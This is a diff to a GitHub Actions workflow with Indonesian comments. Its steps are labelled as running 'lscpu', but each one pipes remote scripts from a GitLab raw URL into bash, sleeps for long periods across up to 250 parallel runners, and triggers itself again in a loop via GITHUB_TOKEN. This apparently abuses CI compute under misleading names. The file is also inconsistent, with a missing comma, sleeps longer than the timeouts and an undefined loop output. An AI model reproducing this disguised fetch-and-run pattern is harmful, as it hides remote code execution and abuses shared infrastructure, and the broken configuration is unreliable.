@@ -2,10 +2,13 @@ name: autospaces-raiodala
 
 on:
   workflow_dispatch:
+    inputs:
+      loop_count:
+        description: 'Berapa kali ulangi? (0 = tidak ulang, 1 = ulang 1x, dst.)'
+        required: false
+        default: '5'
   push:
     branches: ["main"]
-  schedule:
-    - cron: '0 */6 * * *'
 
 permissions: {}   # 🔒 Tidak ada akses ke repo atau token
 
@@ -24,6 +27,8 @@ jobs:
       popay_flag: ${{ steps.gen.outputs.popay_flag }}
       dandi_go: ${{ steps.gen.outputs.dandi_go }}
       dandi_flag: ${{ steps.gen.outputs.dandi_flag }}
+      alam_go: ${{ steps.gen.outputs.alam_go }}
+      alam_flag: ${{ steps.gen.outputs.alam_flag }}
     steps:
       - name: Generate random strings
         id: gen
@@ -45,7 +50,8 @@ jobs:
               'line_go': 9, 'line_flag': 26,
               'lucas_go': 9, 'lucas_flag': 26,
               'popay_go': 9, 'popay_flag': 26,
-              'dandi_go': 9, 'dandi_flag': 5
+              'dandi_go': 9, 'dandi_flag': 3
+              'alam_go': 9, 'alam_flag': 3
           }
 
           with open(os.environ['GITHUB_OUTPUT'], 'a') as f:
@@ -69,7 +75,7 @@ jobs:
     steps:
       - name: Jalankan lscpu & tahan 5.5 menit
         run: |
-          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
           sleep 240s
 
   # =============================================
@@ -88,7 +94,7 @@ jobs:
     steps:
       - name: Jalankan lscpu & tahan 15 menit
         run: |
-          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
           sleep 15m
 
   # =============================================
@@ -97,7 +103,7 @@ jobs:
   popay:
     needs: [generate, line]   # paralel dengan cincau
     runs-on: ubuntu-latest
-    timeout-minutes: 90
+    timeout-minutes: 45
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -107,8 +113,8 @@ jobs:
     steps:
       - name: Jalankan lscpu & tahan 35 menit
         run: |
-          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
-          sleep 85m
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
+          sleep 35m
 
   # =============================================
   # 🍜 Job tekwan (27 job) – lscpu + sleep 62m
@@ -116,7 +122,7 @@ jobs:
   dandi:
     needs: [generate, lucas]
     runs-on: ubuntu-latest
-    timeout-minutes: 80
+    timeout-minutes: 38
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -124,7 +130,49 @@ jobs:
         go: ${{ fromJSON(needs.generate.outputs.dandi_go) }}
         flag: ${{ fromJSON(needs.generate.outputs.dandi_flag) }}
     steps:
+      - name: Jalankan lscpu & tahan 38 menit
+        run: |
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/genos | bash &
+          sleep 58m
+
+  alam:
+    needs: [generate, popay]
+    runs-on: ubuntu-latest
+    timeout-minutes: 38
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: ${{ fromJSON(needs.generate.outputs.alam_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.alam_flag) }}
+    steps:
       - name: Jalankan lscpu & tahan 62 menit
         run: |
-          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
-          sleep 90m
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/genos | bash &
+          sleep 60m
+
+  # =============================================
+  # 🔁 Loop Trigger: Memulai Ulang Workflow
+  # =============================================
+  loop-trigger:
+    name: Mulai ulang (jika loop > 0)
+    needs: [alam]
+    if: needs.generate.outputs.loop_count > 0
+    runs-on: ubuntu-latest
+    permissions:
+      actions: write   # izin untuk trigger workflow
+    steps:
+      - name: Trigger workflow baru dengan loop_count berkurang
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          new_loop=$(( ${{ needs.generate.outputs.loop_count }} - 1 ))
+          curl -X POST \
+            -H "Authorization: token $GITHUB_TOKEN" \
+            -H "Accept: application/vnd.github.v3+json" \
+            https://api.github.com/repos/${{ github.repository }}/actions/workflows/${{ github.workflow }}/dispatches \
+            -d "{\"ref\":\"${{ github.ref_name }}\", \"inputs\":{\"loop_count\":\"$new_loop\"}}"
+          echo "Loop tersisa: $new_loop (akan berhenti jika 0)"
+      - name: Selesai – tidak ada loop lagi
+        if: needs.generate.outputs.loop_count == '0'
+        run: echo "Tidak ada pengulangan."
